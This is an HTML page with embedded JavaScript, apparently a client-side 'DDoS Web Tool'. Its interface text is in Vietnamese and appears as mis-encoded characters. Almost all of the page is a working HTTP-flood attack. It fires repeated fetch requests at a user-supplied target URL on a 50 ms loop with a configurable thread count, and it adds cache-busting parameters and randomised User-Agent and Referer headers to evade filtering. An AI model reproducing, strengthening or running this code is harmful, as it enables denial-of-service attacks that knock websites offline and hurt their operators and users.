<!DOCTYPE html>
<html>
<head>
    <title>DDoS Web Tool (Client-Side - MAX Performance)</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            background-color: #fff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 80%;
            max-width: 600px;
        }

        h1 {
            color: #333;
            margin-bottom: 20px;
        }

        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: bold;
        }

        .form-group input[type="text"],
        .form-group input[type="number"],
        .form-group select {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 16px;
        }

        button {
            background-color: #d9534f; /* ƒê·ªè */
            color: white;
            padding: 12px 25px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 18px;
            transition: background-color 0.3s ease, transform 0.1s ease; /* Animation n√∫t */
        }

        button:hover {
            background-color: #c9302c; /* ƒê·ªè ƒë·∫≠m h∆°n */
        }

        button:active {
            transform: scale(0.95); /* Hi·ªáu ·ª©ng nh·∫•n n√∫t */
        }

        #status {
            margin-top: 20px;
            font-weight: bold;
            animation: pulseStatus 1.5s infinite; /* Animation tr·∫°ng th√°i */
            min-height: 2em; /* ƒê·∫£m b·∫£o ƒë·ªß kh√¥ng gian cho th√¥ng b√°o */
        }

        @keyframes pulseStatus {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.6; }
        }

        .attacking-container {
            background-color: #ffe0b2; /* M√†u cam nh·∫°t khi t·∫•n c√¥ng */
        }

        #progressBarContainer {
            width: 100%;
            background-color: #eee;
            border-radius: 4px;
            margin-top: 10px;
            overflow: hidden; /* ƒê·ªÉ bo tr√≤n g√≥c thanh ti·∫øn tr√¨nh */
        }

        #progressBar {
            width: 0%;
            height: 20px;
            background-color: #4CAF50; /* M√†u xanh l√° c√¢y */
            border-radius: 4px;
            transition: width 0.1s ease; /* Animation m∆∞·ª£t m√† cho thanh ti·∫øn tr√¨nh */
        }

        #requestsSent {
            margin-top: 10px;
            font-style: italic;
            color: #777;
        }
    </style>
</head>
<body>
    <div class="container" id="mainContainer">
        <h1>DDoS Web Tool (Client-Side - MAX Performance)</h1>
        <div class="form-group">
            <label for="targetUrl">URL m·ª•c ti√™u:</label>
            <input type="text" id="targetUrl" placeholder="Nh·∫≠p URL m·ª•c ti√™u (v√≠ d·ª•: http://example.com)">
        </div>
        <div class="form-group">
            <label for="attackMethod">Ph∆∞∆°ng th·ª©c t·∫•n c√¥ng:</label>
            <select id="attackMethod">
                <option value="http-flood">HTTP Flood (Client-Side - MAX)</option>
                <option value="none">Kh√¥ng kh·∫£ d·ª•ng (Slowloris, UDP Flood - Client-Side)</option>
            </select>
        </div>
        <div class="form-group">
            <label for="threads">S·ªë lu·ªìng (threads - ƒë·ªìng th·ªùi):</label>
            <input type="number" id="threads" value="100" min="1"> <!-- TƒÉng threads m·∫∑c ƒë·ªãnh -->
        </div>
        <div class="form-group">
            <label for="duration">Th·ªùi gian t·∫•n c√¥ng (gi√¢y):</label>
            <input type="number" id="duration" value="20" min="1"> <!-- TƒÉng duration m·∫∑c ƒë·ªãnh -->
        </div>
        <button id="startAttack">üî• B·∫ÆT ƒê·∫¶U T·∫§N C√îNG T·ªêI ƒêA! üî•</button>
        <div id="status">S·∫µn s√†ng cho cu·ªôc t·∫•n c√¥ng t·ªëi ƒëa...</div>
        <div id="progressBarContainer">
            <div id="progressBar"></div>
        </div>
        <div id="requestsSent"></div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const startAttackButton = document.getElementById('startAttack');
            const statusDiv = document.getElementById('status');
            const mainContainer = document.getElementById('mainContainer');
            const progressBar = document.getElementById('progressBar');
            const requestsSentDiv = document.getElementById('requestsSent');

            startAttackButton.addEventListener('click', function() {
                const targetUrl = document.getElementById('targetUrl').value;
                const attackMethod = document.getElementById('attackMethod').value;
                const threads = parseInt(document.getElementById('threads').value);
                const duration = parseInt(document.getElementById('duration').value);

                if (!targetUrl) {
                    statusDiv.textContent = 'L·ªñI: Vui l√≤ng nh·∫≠p URL m·ª•c ti√™u!';
                    statusDiv.style.color = 'red';
                    return;
                }

                if (attackMethod === 'none') {
                    statusDiv.textContent = 'L·ªñI: Ph∆∞∆°ng th·ª©c n√†y kh√¥ng kh·∫£ d·ª•ng ·ªü ph√≠a client!';
                    statusDiv.style.color = 'red';
                    return;
                }

                statusDiv.textContent = 'üî• ƒêANG KH·ªûI ƒê·ªòNG CU·ªòC T·∫§N C√îNG HTTP FLOOD T·ªêI ƒêA (Client-Side)... üî•';
                statusDiv.style.color = 'orange';
                mainContainer.classList.add('attacking-container');
                progressBar.style.width = '0%'; // Reset progress bar
                requestsSentDiv.textContent = '';
                let sentRequestsCounter = 0;

                const startTime = Date.now();
                let attackInterval;
                const userAgents = [ // Danh s√°ch User-Agent ng·∫´u nhi√™n
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/96.0.1054.62",
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1"
                    // ... B·∫°n c√≥ th·ªÉ th√™m nhi·ªÅu User-Agent h∆°n
                ];
                const referers = [ // Danh s√°ch Referer ng·∫´u nhi√™n
                    "https://www.google.com/",
                    "https://www.facebook.com/",
                    "https://www.youtube.com/",
                    "https://twitter.com/",
                    "https://www.example.com/"
                    // ... B·∫°n c√≥ th·ªÉ th√™m nhi·ªÅu Referer h∆°n
                ];

                const sendHttpRequest = () => {
                    if (Date.now() - startTime >= duration * 1000) {
                        clearInterval(attackInterval);
                        statusDiv.textContent = `üî• CU·ªòC T·∫§N C√îNG T·ªêI ƒêA HO√ÄN T·∫§T (Client-Side)! üî• ƒê√£ g·ª≠i T·ªîNG C·ªòNG ${sentRequestsCounter} requests. (L∆∞u √Ω: V·∫´n l√† m√¥ ph·ªèng, hi·ªáu qu·∫£ R·∫§T H·∫†N CH·∫æ)`;
                        statusDiv.style.color = 'green';
                        mainContainer.classList.remove('attacking-container');
                        return;
                    }

                    const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
                    const randomReferer = referers[Math.floor(Math.random() * referers.length)];
                    const cacheBuster = `?rand=${Math.random()}`; // Cache busting
                    const requestUrl = targetUrl + cacheBuster;

                    fetch(requestUrl, {
                        mode: 'no-cors',
                        keepalive: true, // Th·ª≠ nghi·ªám keepalive
                        headers: {
                            'User-Agent': randomUserAgent,
                            'Referer': randomReferer
                        }
                    })
                    .then(response => {
                        sentRequestsCounter++;
                        requestsSentDiv.textContent = `Requests ƒë√£ g·ª≠i: ${sentRequestsCounter}`;
                        // console.log(`Client-Side HTTP Flood: Request sent, status: ${response.status}`); // T·∫Øt log ƒë·ªÉ gi·∫£m t·∫£i tr√¨nh duy·ªát
                    })
                    .catch(error => {
                        console.error('Client-Side HTTP Flood Error:', error);
                    });
                };

                const totalRequests = threads * (duration * 1000 / 50); // ∆Ø·ªõc t√≠nh t·ªïng s·ªë request (c√≥ th·ªÉ kh√¥ng ch√≠nh x√°c)
                let requestsSentInInterval = 0; // ƒê·∫øm request trong m·ªói interval ƒë·ªÉ c·∫≠p nh·∫≠t progress bar

                attackInterval = setInterval(() => {
                    const promises = []; // M·∫£ng ch·ª©a c√°c Promise cho fetch
                    for (let i = 0; i < threads; i++) {
                        promises.push(sendHttpRequest()); // Th√™m Promise v√†o m·∫£ng
                    }
                    Promise.all(promises).then(() => { // Ch·ªù t·∫•t c·∫£ c√°c request trong interval ho√†n th√†nh (kh√¥ng th·ª±c s·ª± c·∫ßn thi·∫øt cho DDoS, nh∆∞ng c√≥ th·ªÉ h·ªØu √≠ch cho vi·ªác ƒë·∫øm)
                        requestsSentInInterval += threads; // C·∫≠p nh·∫≠t s·ªë request ƒë√£ g·ª≠i trong interval
                        const progress = (Date.now() - startTime) / (duration * 1000) * 100; // T√≠nh ph·∫ßn trƒÉm ti·∫øn tr√¨nh
                        progressBar.style.width = `${progress}%`; // C·∫≠p nh·∫≠t thanh ti·∫øn tr√¨nh
                        if (progress > 100) progressBar.style.width = '100%'; // ƒê·∫£m b·∫£o kh√¥ng v∆∞·ª£t qu√° 100%
                    });

                }, 50); // Interval g·ª≠i request (gi·∫£m xu·ªëng ƒë·ªÉ tƒÉng t·ªëc ƒë·ªô, th·ª≠ nghi·ªám c·∫©n th·∫≠n)

            });
        });
    </script>
</body>
</html>